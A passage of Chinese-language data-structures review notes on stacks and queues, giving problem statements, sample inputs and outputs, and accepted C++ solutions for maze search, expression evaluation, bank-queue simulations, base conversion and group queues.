1 1 1 0 1 1 1 1 0 1\n1 0 0 0 0 0 0 0 0 0 0 1\n0 0 1 1 1 1 0 1 0 1 1 0\n0 1 1 1 1 1 1 1 1 1 0 0\n0 0 0 0 0 0 0 0 0 0 0 1\n1 1 1 1 0 1 1 1 1 1 0 1\n1 1 1 1 1 0 1 1 1 1 0 1\n1 1 1 1 1 0 0 0 0 0 0 0\n1 1 1 1 1 1 1 1 0 1 1 1\n0 1 0 1 0 1 0 1 0 0 0 0\n12\n0 1 1 1 1 1 1 1 1 1 1 0\n0 0 0 0 0 0 0 0 0 0 0 1\n0 1 1 1 1 0 1 1 1 1 0 1\n1 0 0 0 0 0 0 0 0 0 0 1\n0 0 1 1 1 1 0 1 0 1 1 0\n0 1 1 1 1 1 1 1 1 1 0 0\n0 0 0 0 0 0 0 0 0 0 1 1\n1 1 1 1 0 1 1 1 1 1 0 1\n1 1 1 1 1 0 1 1 1 1 0 1\n1 1 1 1 1 0 0 0 0 0 0 0\n1 1 1 1 1 1 1 1 0 1 1 1\n0 1 0 1 0 1 0 1 0 0 0 0\n```\n\n样例2输出：\n\n```\n[0,0]--[1,0]--[1,1]--[1,2]--\n[1,3]--[1,4]--[1,5]--[1,6]--\n[1,7]--[1,8]--[1,9]--[1,10]--\n[2,10]--[3,10]--[3,9]--[3,8]--\n[3,7]--[3,6]--[3,5]--[3,4]--\n[3,3]--[3,2]--[3,1]--[4,1]--\n[4,0]--[5,0]--[6,0]--[6,1]--\n[6,2]--[6,3]--[6,4]--[6,5]--\n[6,6]--[6,7]--[6,8]--[6,9]--\n[6,10]--[7,10]--[8,10]--[9,10]--\n[9,9]--[9,8]--[10,8]--[11,8]--\n[11,9]--[11,10]--[11,11]--END\nno path\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<stack>\nusing namespace std;\n\nint dir[4][2] = { {0,1},{1,0},{0,-1},{-1,0} };\nbool vis[100][100];\nint mp[100][100];\n\nint main()\n{\n\tint t, n;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstack<pair<int, int>>path, path1;\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n + 2; i++)mp[0][i] = mp[i][0] = mp[n + 1][i] = mp[i][n + 1] = 1;\n\t\tfor (int i = 1; i <= n; i++)\n\t\t\tfor (int j = 1; j <= n; j++)\n\t\t\t\tcin >> mp[i][j];\n\n\t\tpath.push(make_pair(1, 1));\n\t\twhile (!path.empty())\n\t\t{\n\t\t\tvis[1][1] = 1;\n\t\t\tpair<int, int>pos = path.top();\n\t\t\tif (pos.first == n && pos.second == n)break;\n\t\t\tint cnt = 0;\n\t\t\tfor (int i = 0; i < 4; i++)\n\t\t\t{\n\t\t\t\tpair<int, int>tmp = path.top();\n\t\t\t\tint xx = tmp.first + dir[i][0], yy = tmp.second + dir[i][1];\n\t\t\t\tif (!mp[xx][yy] && !vis[xx][yy])\n\t\t\t\t{\n\t\t\t\t\tpath.push(make_pair(xx, yy)), vis[xx][yy] = 1;\n\t\t\t\t\tcnt++;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(!cnt)path.pop();\n\t\t}\n\t\tif (!path.empty())\n\t\t{//......若干代码，实现path的数据导入path1\n\t\t\twhile (!path.empty())\n\t\t\t{\n\t\t\t\tpair<int, int>tmp = path.top();\n\t\t\t\ttmp.first--, tmp.second--;\n\t\t\t\tpath1.push(tmp);\n\t\t\t\tpath.pop();\n\t\t\t}\n\t\t\tint i = 0;  //以下是输出路径的代码\n\t\t\tpair<int,int> cpos;\n\t\t\twhile (!path1.empty())\n\t\t\t{\n\t\t\t\tcpos = path1.top();\n\t\t\t\tif ((++i) % 4 == 0)\n\t\t\t\t\tcout << '[' << cpos.first << ',' << cpos.second << ']' << \"--\" << endl;\n\t\t\t\telse\n\t\t\t\t\tcout << '[' << cpos.first << ',' << cpos.second << ']' << \"--\";\n\t\t\t\tpath1.pop();\n\t\t\t}\n\t\t\tcout << \"END\" << endl;\n\t\t}\n\t\telse\n\t\t\tcout << \"no path\" << endl;\n\t}\n}\n```\n\n\n\n#### 链栈\n\n栈的链式存储结构称为链栈，它是运算受限的单链表，插入和删除操作仅限制在表头位置上进行。\n\n链栈相当于没有头结点的链表\n\n链栈在表头进行入栈，出栈操作，不需要头结点。\n\n**栈顶指针即头指针**。\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131172843784.png\" alt=\"image-20230131172843784\" style=\"zoom:50%;\" />\n\n\n\n#### 表达式求值\n\n使用符号栈和操作数栈\n\n````\n计算步骤：假设操作数栈NS和运算符栈OS。\n   1）依次读取表达式，若为操作数，则直接进NS栈；\n       若为运算符(记为op2)，转（2）\n   2）将op2与运算符栈顶元素(记为op1)按P53的表3.13\n        比较优先权，并按如下规则进行操作：\n 若prec(op1) < prec(op2), 则op2入OS;\n 若prec(op1) = prec(op2), 则op1出栈，脱括号，回到\n    1）； \n 若prec(op1) > prec(op2), 则NS出2个操作数num2,\n    num1，op1出栈，计算num2 op1 num2，结果入NS；回到    \n    2) 。\n3）重复1）、2）直至整个表达式求值完毕。\n````\n\n两个计算示例：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131173219901.png\" alt=\"image-20230131173219901\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131173231502.png\" alt=\"image-20230131173231502\" style=\"zoom:50%;\" />\n\n#### 波兰式与逆波兰式\n\n```\n表达式a+b*(c-d)-e/f的\n   (1) 前缀表达式(波兰式)：-+a*b-cd/ef\n   (2) 中缀表达式：a+b*(c-d)-e/f\n   (3) 后缀表达式(逆波兰式): abcd-*+ef/-\n```\n\n\n\n#### 【程序填空】表达式计算（栈应用）\n\n题目:\n\n```\n使用C++自带的stack栈模板来实现四则运算表达式求值\n算法描述参考第3.2.5节\n算法伪代码参考P53-54的算法3.4\n例如\n1. Push (OPTR, '#');表示把字符#压入堆栈OPTR中，转换成c++代码就是OPTR.push('#');\n2. Pop(OPND, a); 表示弹出栈OPND的栈顶元素，并把栈顶元素放入变量a中。因此改成c++代码是两个操作：a = OPND.top();   OPND.pop()\n3. a = GetTop(OPND)表示获取栈OPND的栈顶元素，转成c++代码就是： a = OPND.top();\n\n大家主要是改造表达式求值函数EvaluateExpression的代码\n\n输入\n第一个输入t，表示有t个实例\n第二行起，每行输入一个表达式，每个表达式末尾带#表示结束\n输入t行\n\n输出\n每行输出一个表达式的计算结果，计算结果用浮点数（含2位小数）的格式表示\n参考代码如下：\n```\n\n```cpp\n#include <iostream>\n#include<iomanip>\nusing namespace std;\nint main()\n{ double temp = 12.345678\n  cout<<fixed<<setprecision(2)<<temp<<endl;\n}\n//输出结果为12.35\n```\n\n样例：\n\n```\n2\n1+2*3-4/5#\n(66+(((11+22)*2-33)/3+6)*2)-45.6789#\n```\n\n样例输出：\n\n```\n6.20\n54.32\n```\n\nAC代码：\n\n```cpp\n#include <iostream>\n#include <string>\n#include <cstring>\n#include <stack>\n#include <iomanip>\nusing namespace std;\n\n#define OPSETSIZE 7\nunsigned char Prior[7][7] = { //运算符间的优先关系\n  \t  '>','>','<','<','<','>','>',\n\t  '>','>','<','<','<','>','>',\n\t  '>','>','>','>','<','>','>',\n\t  '>','>','>','>','<','>','>',\t\n\t  '<','<','<','<','<','=',' ',\n\t  '>','>','>','>',' ','>','>',\n\t  '<','<','<','<','<',' ','='\n};\t\t\nchar OPSET[OPSETSIZE]={'+' , '-' , '*' , '/' ,'(' , ')' , '#'}; //运算符集合\n\ndouble Operate(double a, unsigned char theta, double b);\t//计算类似a+b的表达式结果\nbool In(char Test, char* TestOp); //判断字符Test是否是运算符，是则返回true\nchar precede(char Aop, char Bop); //返回两个运算符优先级的比较结果 \n\n//以下完成算术表达式求值函数EvaluateExpression(string MyExp)的填空\ndouble EvaluateExpression(string MyExp) //算术表达式求值算法\n//设OPTR和OPND分别为运算符栈和运算数栈\n//参数MyExp是表达式字符串\n{\tstack<char> OPTR;\t\t//运算符栈，字符元素\n\tstack<double> OPND;\t//运算数栈，实数元素\n\tchar TempData[20];\n\tdouble Data,a,b, r;\n\tchar theta, c,x,Dr[2];\n\tOPTR.push('#');\n\tstrcpy(TempData,\"\\0\");\n\tint i=0;\t\t//表达式字符串的当前字符位置\n\tc = MyExp[i];\t//表达式字符串的当前字符\n\n\t//逐个读入表达式字符串的字符到变量c，并识别为数值或运算符，做相应处理\n/********** Write your code here! **********/\n```\n\n```cpp\nint cnt = 0;\n\tfor (int i = 0; i < MyExp.size(); i++)\n\t{\n\t\ttheta = OPTR.top();\n\t\tc = MyExp[i];\n\t\tif (c >= '0' && c <= '9' || c == '.')TempData[cnt++] = c;//判断是否为数字\n\t\telse\n\t\t{\n\t\t\tif (cnt)//遇到了非数字，说明数字已经读入，进行数字操作\n\t\t\t{\n\t\t\t\tdouble tmp = TempData[0] - '0';\n\t\t\t\tTempData[cnt] = 'x';\n\t\t\t\tbool xs = 0;\n\t\t\t\tint p = 0;\n\t\t\t\tfor (int j = 1; j < 20; j++)\n\t\t\t\t{\n\t\t\t\t\tif (TempData[j] == 'x')\n\t\t\t\t\t{\n\t\t\t\t\t\tfor (int k = 0; k < p; k++)tmp /= 10;\n\t\t\t\t\t\tstrcpy(TempData, \"\\0\");\n\t\t\t\t\t\tcnt = 0;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (TempData[j] == '.')\n\t\t\t\t\t{\n\t\t\t\t\t\txs = 1;\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t\tif (xs)p++;\n\t\t\t\t\ttmp = tmp * 10 + TempData[j] - '0';\n\n\t\t\t\t}\n\t\t\t\tOPND.push(tmp);\n\t\t\t}\n\n\t\t\tif (precede(theta, c) == '<')OPTR.push(c);\n\t\t\telse if(precede(theta, c) == '>')\n\t\t\t{\n\t\t\t\tx = OPTR.top();\n\t\t\t\tOPTR.pop();\n\t\t\t\tb = OPND.top();\n\t\t\t\tOPND.pop();\n\t\t\t\ta = OPND.top();\n\t\t\t\tOPND.pop();\n\t\t\t\tr = Operate(a, x, b);\n\t\t\t\tOPND.push(r);\n\t\t\t\tif(c!='#' && c != ')')OPTR.push(c);\n\t\t\t\ttheta = OPTR.top();\n\t\t\t\twhile (c == ')' && theta != '(')\n\t\t\t\t{\n\t\t\t\t\tx = OPTR.top();\n\t\t\t\t\tOPTR.pop();\n\t\t\t\t\tb = OPND.top();\n\t\t\t\t\tOPND.pop();\n\t\t\t\t\ta = OPND.top();\n\t\t\t\t\tOPND.pop();\n\t\t\t\t\tr = Operate(a, x, b);\n\t\t\t\t\tOPND.push(r);\n\t\t\t\t\ttheta = OPTR.top();\n\t\t\t\t}\n\t\t\t\tif (precede(theta, c) == '=')OPTR.pop();\n\t\t\t}\n\t\t\tif (c == '#')\n\t\t\t{\n\t\t\t\twhile (!OPTR.empty())\n\t\t\t\t{\n\t\t\t\t\tx = OPTR.top();\n\t\t\t\t\tOPTR.pop();\n\t\t\t\t\tb = OPND.top();\n\t\t\t\t\tOPND.pop();\n\t\t\t\t\ta = OPND.top();\n\t\t\t\t\tOPND.pop();\n\t\t\t\t\tr = Operate(a, x, b);\n\t\t\t\t\tOPND.push(r);\n\t\t\t\t\ttheta = OPTR.top();\n\t\t\t\t\tif (precede(theta, c) == '=')OPTR.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn OPND.top();\n```\n\n```cpp\n/*******************************************/\n} //这是函数EvaluateExpression的右花括号\n//函数EvaluateExpression的代码到此结束\n\n\n//以下填空完成其他函数的定义，包括函数Operate\\函数In\\函数precede\n//可以参考教材光盘中文件夹CHAP03的源代码ALGO0304.cpp，几乎照抄\n/********** Write your code here! **********/\n```\n\n```cpp\ndouble Operate(double a, unsigned char theta, double b)\n{\n\tif (theta == '+')return a + b;\n\telse if (theta == '-')return a - b;\n\telse if (theta == '*')return a * b;\n\telse if (theta == '/')return a / b;\n}\n\nbool In(char Test, char* TestOp)\n{\n\tfor (int i = 0; i < 7; i++)\n\t{\n\t\tif (Test == OPSET[i])return true;\n\t}\n\treturn false;\n}\n\nchar precede(char Aop, char Bop)\n{\n\tint aid, bid;\n\tfor (int i = 0; i < 7; i++)\n\t{\n\t\tif (Aop == OPSET[i])aid = i;\n\t\tif (Bop == OPSET[i])bid = i;\n\t}\n\treturn Prior[aid][bid];\n}\n```\n\n```cpp\n/*******************************************/\n//主函数\nint main()\n{\tstring Exp;\n\tint t;\n\tdouble result;\n\tcin>>t;\n\twhile (t--)\n\t{\tcin>>Exp;\n\t\tresult=EvaluateExpression(Exp);\n\t\tcout<<fixed<<setprecision(2)<<result<<endl;\n\t}\t\n\n\treturn 0;\n}\n```\n\n\n\n\n\n\n\n## 队列\n\n#### 循环队列(笔试常考)\n\n* 循环队列采用一组地址连续的存储单元\n\n* 将整个队列的存储单元首尾相连\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131180503931.png\" alt=\"image-20230131180503931\" style=\"zoom:50%;\" />\n\n循环队列遍历：\n\n```cpp\nif(i+1==MAXQSIZE)\n           i=0;\n     else\n          i++;\n```\n\n或更加简便的\n\n```cpp\ni=(i+1)% MAXQSIZE\n```\n\n\n\n判断循环队列的空与满\n\n对循环队列而言，无法通过front==rear来判断队列“空”还是“满”。\n\n对于循环队列来说，队列空与满都可能出现front==rear\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230131181340524.png\" alt=\"image-20230131181340524\" style=\"zoom:50%;\" />\n\n解决方法：\n\n* 其一是另设一个布尔变量以匹别队列的空和满；\n\n* 其二是使用一个计数器记录队列中元素的总数（实际上是队列长度）。\n\n* 其三是少用一个元素的空间，约定入队前，测试尾指针在循环意义下加1后是否等于头指针，若相等则认为队满（**注意：rear所指的单元始终为空**）\n\n  ```cpp\n  front == rear，循环队列空\n  (rear+1) % MAXQSIZE == front，循环队列满\n  ```\n\n  \n\n循环队列的各操作语句：\n\n入队：\n\n```cpp\nbase[rear] = e;\nrear = (rear+`1) % MaxSize;\n//队尾入队\n```\n\n出队：\n\n```cpp\ne = base[rear];\nfront = (front+1) % MaxSize;\n//队头出队\n```\n\n队空:\n\n```cpp\nfront == rear;\n```\n\n队满：\n\n```cpp\n(rear+1) % MaxSize == front;\n```\n\n队列元素数：\n\n```cpp\n(rear - front + MaxSize) % MaxSize;\n```\n\n\n\n#### DS队列之银行排队\n\n题目:\n\n```\n在银行营业大厅共服务3种客户，类型为A\\B\\C，大厅分别设置了3个窗口分别服务三种客户，即每个窗口只服务一种客户。现有一批客户来银行办理业务，每个客户都有类型和办理业务时间。每个窗口按照客户到来的顺序进行服务。\n\n编程实现它们的办理流程，请使用C++自带的queue必须使用队列实现，其他方法0分！\n\n队列queue的用法如下：\n1.包含头文件：#include <queue>\n2.定义一个整数队列对象：queue<int>  myQe;\n3.定义一个整数队列对象数组：queue<int>  myQA[10];\n4.入队操作：myQe.push(itemp); //把整数itemp进入队列\n5.出队操作：myQe.pop();  //把队头元素弹出队列，注意本操作不获取队头元素\n6.获取队头元素： itemp = myQe.front(); // 把队头元素放入itemp中，注意本操作不弹出元素\n7.判断队列是否为空：myQe.empty();//队列空则返回true，不空则返回false\n\n输入\n第一行输入先输入n表示客户数量\n第二行输入每个客户的类型，数据之间用用空格隔开\n第三行输入每个客户的办理时间，数据之间用用空格隔开\n\n输出\n第一行输出A类客户的平均办理时间\n第二行输出B类客户的平均办理时间\n第三行输出C类客户的平均办理时间\n```\n\n样例：\n\n```\n8\nA B C B C A A A\n10 20 30 40 50 60 70 80\n```\n\n样例输出：\n\n```\n55\n30\n40\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nint main()\n{\n\tqueue<int>q[3];\n\tint n;\n\tcin >> n;\n\tchar* tp = new char[n];\n\tint* t = new int[n];\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> tp[i];\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> t[i];\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (tp[i] == 'A')q[0].push(t[i]);\n\t\telse if (tp[i] == 'B')q[1].push(t[i]);\n\t\telse q[2].push(t[i]);\n\t}\n\tfor (int i = 0; i < 3; i++)\n\t{\n\t\tint sum = 0;\n\t\tint siz = q[i].size();\n\t\twhile (!q[i].empty())\n\t\t{\n\t\t\tsum += q[i].front();\n\t\t\tq[i].pop();\n\t\t}\n\t\tsum /= siz;\n\t\tcout << sum << endl;\n\t}\n\tdelete[]tp;\n\tdelete[]t;\n\treturn 0;\n}\n```\n\n\n\n#### 银行排队问题之单队列多窗口服务\n\n题目:\n\n```\n假设银行有K个窗口提供服务，窗口前设一条黄线，所有顾客按到达时间在黄线后排成一条长龙。当有窗口空闲时，下一位顾客即去该窗口处理事务。当有多个窗口可选择时，假设顾客总是选择编号最小的窗口。\n\n本题要求输出前来等待服务的N位顾客的平均等待时间、最长等待时间、最后完成时间，并且统计每个窗口服务了多少名顾客。\n\n输入\n输入第1行给出正整数N（≤1000），为顾客总人数；随后N行，每行给出一位顾客的到达时间T和事务处理时间P，并且假设输入数据已经按到达时间先后排好了顺序；最后一行给出正整数K（≤10），为开设的营业窗口数。这里假设每位顾客事务被处理的最长时间为60分钟。\n\n输出\n在第一行中输出平均等待时间（输出到小数点后1位）、最长等待时间、最后完成时间，之间用1个空格分隔，行末不能有多余空格。\n在第二行中按编号递增顺序输出每个窗口服务了多少名顾客，数字之间用1个空格分隔，行末不能有多余空格。\n```\n\n样例：\n\n```\n9\n0 20\n1 15\n1 61\n2 10\n10 5\n10 3\n30 18\n31 25\n31 2\n3\n```\n\n样例输出：\n\n```\n6.2 17 61\n5 3 1\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\n#include<iomanip>\nusing namespace std;\n\nint main() \n{\n\tint n, k;\n\tcin >> n;\n\tqueue<pair<int, int>>q;\n\tfor(int i = 0;i < n; i++)\n\t{\n\t\tint t, p;\n\t\tcin >> t >> p;\n\t\tp = min(p, 60);\n\t\tq.push(make_pair(t, p));\n\t}\n\tcin >> k;\n\tint sum = 0, mxwait = 0, minwait = 0;\n\tint win[11] = { 0 }, winsum[11] = { 0 };\n\twhile (!q.empty())\n\t{\n\t\tint t = q.front().first, p = q.front().second;\n\t\tint mint = 0x3f3f3f, minid = 0;\n\t\tbool flag = 0;\n\t\tfor (int i = 0; i < k; i++)\n\t\t{\n\t\t\tif (winsum[i] < t)\n\t\t\t{\n\t\t\t\twinsum[i] = t + p;\n\t\t\t\twin[i]++;\n\t\t\t\tflag = 1;\n\t\t\t\tq.pop();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (mint > winsum[i])\n\t\t\t{\n\t\t\t\tmint = winsum[i];\n\t\t\t\tminid = i;\n\t\t\t}\n\t\t}\n\t\tif (!flag)\n\t\t{\n\t\t\tminwait = mint - t;\n\t\t\tmxwait = max(mxwait, minwait);\n\t\t\tsum += minwait;\n\t\t\twinsum[minid] = mint + p;\n\t\t\twin[minid]++;\n\t\t\tq.pop();\n\t\t}\n\t}\n\tint late = 0;\n\tfor (int i = 0; i < k; i++)late = max(late, winsum[i]);\n\tcout << fixed << setprecision(1) << ((double)sum / n) << ' ' << mxwait << ' ' << late << endl;\n\tfor (int i = 0; i < k; i++)\n\t{\n\t\tcout << win[i];\n\t\tif (i == k - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 银行排队问题之单队列多窗口加VIP服务#\n\n题目:\n\n```\n假设银行有K个窗口提供服务，窗口前设一条黄线，所有顾客按到达时间在黄线后排成一条长龙。当有窗口空闲时，下一位顾客即去该窗口处理事务。当有多个窗口可选择时，假设顾客总是选择编号最小的窗口。\n\n有些银行会给VIP客户以各种优惠服务，例如专门开辟VIP窗口。为了最大限度地利用资源，VIP窗口的服务机制定义为：当队列中没有VIP客户时，该窗口为普通顾客服务；当该窗口空闲并且队列中有VIP客户在等待时，排在最前面的VIP客户享受该窗口的服务。同时，当轮到某VIP客户出列时，若VIP窗口非空，该客户可以选择空闲的普通窗口；否则一定选择VIP窗口。\n本题要求输出前来等待服务的N位顾客的平均等待时间、最长等待时间、最后完成时间，并且统计每个窗口服务了多少名顾客。\n\n输入\n输入第1行给出正整数N（≤1000），为顾客总人数；随后N行，每行给出一位顾客的到达时间T、事务处理时间P和是否VIP的标志（1是VIP，0则不是），并且假设输入数据已经按到达时间先后排好了顺序；最后一行给出正整数K（≤10）—— 为开设的营业窗口数，以及VIP窗口的编号（从0到K−1）。这里假设每位顾客事务被处理的最长时间为60分钟。\n \n输出\n在第一行中输出平均等待时间（输出到小数点后1位）、最长等待时间、最后完成时间，之间用1个空格分隔，行末不能有多余空格。\n在第二行中按编号递增顺序输出每个窗口服务了多少名顾客，数字之间用1个空格分隔，行末不能有多余空格。\n```\n\n样例：\n\n```\n10\n0 20 0\n0 20 0\n1 68 1\n1 12 1\n2 15 0\n2 10 0\n3 15 1\n10 12 1\n30 15 0\n62 5 1\n3 1\n```\n\n样例输出：\n\n```\n15.1 35 67\n4 5 1\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\n#include<iomanip>\nusing namespace std;\n\nstruct node\n{\n\tint t, p, vip;\n\tint id;\n};\n\nint main()\n{\n\tint n, k, winvip;\n\tcin >> n;\n\tqueue<node>q, qvip;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint t, p, v;\n\t\tcin >> t >> p >> v;\n\t\tp = min(p, 60);\n\t\tq.push({ t,p,v,i });\n\t\tif (v)qvip.push({ t,p,v,i });\n\t}\n\tcin >> k >> winvip;\n\tint sum = 0, mxwait = 0, minwait = 0;\n\tint win[11] = { 0 }, wintime[11] = { 0 };\n\twhile (!q.empty())\n\t{\n\t\tint t = q.front().t, p = q.front().p;\n\t\tint vt = qvip.front().t, vp = qvip.front().p;\n\t\tint mint = 0x3f3f3f, minid = 0;\n\t\tbool flag = 0;\n\t\twhile (!qvip.empty() && vt <= t && vt >= wintime[winvip])\n\t\t{\n\t\t\twintime[winvip] = vt + vp;\n\t\t\twin[winvip]++;\n\t\t\tvt = qvip.front().t, vp = qvip.front().p;\n\t\t\tqvip.pop();\n\t\t}\n\t\tif (q.front().vip && (qvip.empty() || q.front().id != qvip.front().id))\n\t\t{\n\t\t\tq.pop();\n\t\t\tcontinue;\n\t\t}\n\t\tif (q.front().vip)mint = wintime[winvip], minid = winvip;\n\t\telse mint = wintime[0], minid = 0;\n\t\tfor (int i = 0; i < k; i++)\n\t\t{\n\t\t\tif (i == winvip && !qvip.empty())\n\t\t\t{\n\t\t\t\tif (t < wintime[i] && vt < wintime[i] || t >= vt)continue;\n\t\t\t}\n\t\t\tif (t >= wintime[i])\n\t\t\t{\n\t\t\t\twintime[i] = t + p;\n\t\t\t\twin[i]++;\n\t\t\t\tflag = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (wintime[i] < mint)\n\t\t\t{\n\t\t\t\tmint = wintime[i];\n\t\t\t\tminid = i;\n\t\t\t}\n\t\t\t\n\t\t}\t\t\n\t\tif (!flag)\n\t\t{\n\t\t\tsum += wintime[minid] - t;\n\t\t\tmxwait = max(mxwait, wintime[minid] - t);\n\t\t\twintime[minid] += p;\n\t\t\twin[minid]++;\n\t\t}\n\t\tif (q.front().vip)qvip.pop();\n\t\tq.pop();\n\t}\n\tint late = 0;\n\tfor (int i = 0; i < k; i++)late = max(late, wintime[i]);\n\tcout << fixed << setprecision(1) << ((double)sum / n) << ' ' << mxwait << ' ' << late << endl;\n\tfor (int i = 0; i < k; i++)\n\t{\n\t\tcout << win[i];\n\t\tif (i == k - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS队列+堆栈--数制转换\n\n题目:\n\n```\n对于任意十进制数转换为k进制，包括整数部分和小数部分转换。整数部分采用除k求余法，小数部分采用乘k取整法例如x=19.125，求2进制转换\n\n整数部分19，\t\t\t\t\t小数部分0.125\n19 / 2 = 9 … 1\t\t\t\t\t0.125 * 2 = 0.25 … 0\n9 / 2 = 4 … 1\t\t\t\t\t0.25 * 2 = 0.5   … 0\n4 / 2 = 2 … 0 \t\t\t\t\t0.5 * 2 = 1     … 1\n2 / 2 = 1 … 0\n1 / 2 = 0 … 1\n所以整数部分转为 10011，小数部分转为0.001，合起来为10011.001\n提示整数部分可用堆栈，小数部分可用队列实现\n注意：必须按照上述方法来实现数制转换，其他方法0分\n\n输入\n第一行输入一个t，表示下面将有t组测试数据。\n接下来每行包含两个参数n和k，n表示要转换的数值，可能是非整数；k表示要转换的数制，1<k<=16\n\n输出\n对于每一组测试数据，每行输出转换后的结果，结果精度到小数点后3位\n输出小数点后几位的代码如下：\n```\n\n```cpp\n#include<iostream>\n#include<iomanip>\nusing namespace std;\nint main()\n{\ndouble r = 123.56789;\ncout<<fixed<<setprecision(4)<<r<<endl;   //输出小数点后4\nreturn 0;\n}\n```\n\n样例：\n\n```\n2\n19.125 2\n15.125 16\n```\n\n样例输出：\n\n```\n10011.001\nF.200\n```\n\nAC代码：\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\n#include<stack>\nusing namespace std;\n\nint main()\n{\n\tint z, x, n, chm;\n\tdouble a;\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tstack<int>s;\n\t\tqueue<int>q;\n\t\tcin >> a >> chm;\n\t\tx = (int)a;\n\t\ta -= x;\n\t\twhile (x)\n\t\t{\n\t\t\ts.push(x % chm);\n\t\t\tx /= chm;\n\t\t}\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\ta *= chm;\n\t\t\tif (a > chm && a - (int)a == 0)q.push(0);\n\t\t\telse q.push((int)a);\n\t\t}\n\t\twhile(!s.empty())\n\t\t{\n\t\t\tx = s.top();\n\t\t\tswitch (x)\n\t\t\t{\n\t\t\tdefault: cout << x; break;\n\t\t\tcase 10:cout << 'A'; break;\n\t\t\tcase 11:cout << 'B'; break;\n\t\t\tcase 12:cout << 'C'; break;\n\t\t\tcase 13:cout << 'D'; break;\n\t\t\tcase 14:cout << 'E'; break;\n\t\t\tcase 15:cout << 'F'; break;\n\t\t\t}\n\t\t\ts.pop();\n\t\t}\n\t\tcout << '.';\n\t\tfor(int i = 0; i < 3; i++)\n\t\t{\n\t\t\tx = q.front();\n\t\t\tswitch (x)\n\t\t\t{\n\t\t\tdefault: cout << x; break;\n\t\t\tcase 10:cout << 'A'; break;\n\t\t\tcase 11:cout << 'B'; break;\n\t\t\tcase 12:cout << 'C'; break;\n\t\t\tcase 13:cout << 'D'; break;\n\t\t\tcase 14:cout << 'E'; break;\n\t\t\tcase 15:cout << 'F'; break;\n\t\t\t}\n\t\t\tq.pop();\n\t\t}\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS队列--组队列\n\n题目:\n\n```\n组队列是队列结构中一种常见的队列结构，在很多地方有着广泛应用。组队列是是指队列内的元素分组聚集在一起。组队列包含两种命令：\n\n1、 ENQUEUE，表示当有新的元素进入队列，首先会检索是否有同一组的元素已经存在，如果有，则新元素排在同组的最后，如果没有则插入队列末尾。\n2、 DEQUEUE，表示队列头元素出队\n3、 STOP，停止操作\n建议使用C++自带的队列对象queue，编程更方便\n\n输入\n第1行输入一个t(t<=10)，表示1个队列中有多少个组\n第2行输入一个第1组的元素个数和数值\n第3行输入一个第2组的元素个数和数值\n以此类推输入完t组以定义同组元素之后，开始输入多个操作命令(<200)，对空的组队列进行操作，例如输入ENQUEUE 100，表示把元素100插入队列\n\n输出\nDEQUEUE出队的元素\n```\n\n样例1：\n\n```\n2\n3 101 102 103\n3 201 202 203\nENQUEUE 101\nENQUEUE 201\nENQUEUE 102\nENQUEUE 202\nENQUEUE 103\nENQUEUE 203\nDEQUEUE\nDEQUEUE\nDEQUEUE\nSTOP\n```\n\n样例1输出：\n\n```\n101 102 103\n```\n\n样例2：\n\n```\n3\n3 101 102 103\n3 201 202 203\n3 301 302 303\nENQUEUE 201\nENQUEUE 301\nENQUEUE 102\nDEQUEUE\nDEQUEUE\nDEQUEUE\nENQUEUE 101\nENQUEUE 203\nENQUEUE 302\nENQUEUE 301\nDEQUEUE\nDEQUEUE\nDEQUEUE\nSTOP\n```\n\n样例2输出：\n\n```\n201 301 102 101 203 302\n```\n\nAC代码：\n\n使用map容器进行映射\n\n```cpp\n#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<queue>\n#include<map>\n#include<vector>\nusing namespace std;\n\nint main()\n{\n\tint n, t;\n\tcin >> n;\n\tmap<string, int>mp;\n\tqueue<string>q[11];\n\tqueue<string>ans;\n\tfor (int i = 0; i < n; i++)\n\t{\t\n\t\tcin >> t;\n\t\tfor (int j = 0; j < t; j++)\n\t\t{\n\t\t\tstring x;\n\t\t\tcin >> x;\n\t\t\tmp[x] = i + 1;\n\t\t}\n\t}//使用map映射组别\n\tstring op;\n\twhile (cin >> op)\n\t{\n\t\tif (op == \"STOP\")break;\n\t\telse if (op == \"ENQUEUE\")\n\t\t{\n\t\t\tstring x;\n\t\t\tcin >> x;\n\t\t\tfor (int i = 0; i < 10; i++)\n\t\t\t{\n\t\t\t\tif (q[i].empty() || mp[q[i].front()] == 